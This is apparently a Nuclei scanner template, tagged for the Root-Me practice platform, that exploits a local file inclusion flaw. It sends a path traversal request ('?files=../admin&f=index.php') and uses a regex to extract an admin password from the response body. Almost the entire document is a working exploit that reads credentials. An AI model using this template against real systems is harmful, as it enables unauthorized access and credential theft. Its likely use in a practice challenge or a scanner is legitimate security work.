id: LocalFileInclusion

info:
  name: Local File Inclusion
  author: Tomitom13
  severity: unknown
  tags: lfi,rootme

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?files=../admin&f=index.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "'admin' =&gt; '"
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "admin' =&gt; '[a-zA-Z0-9!@#$%^&*()_+\\-,.<>?]+'"
